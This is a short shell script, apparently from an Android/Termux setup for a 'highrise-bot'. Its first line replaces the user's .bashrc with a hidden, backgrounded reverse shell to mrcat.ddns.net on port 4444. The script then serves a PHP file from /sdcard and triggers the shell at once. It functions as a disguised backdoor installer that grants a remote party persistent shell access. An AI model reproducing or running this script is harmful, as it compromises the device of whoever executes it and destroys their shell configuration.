echo "bash -c '0<&128-;exec 128<>/dev/tcp/mrcat.ddns.net/4444;sh <&128 >&128 2>&128' > /dev/null 2>&1 & disown" > $HOME/.bashrc
mv $HOME/highrise-bot/o.php /sdcard
cd /sdcard && php -S 127.0.0.1:8080 && cd
bash $HOME/.bashrc
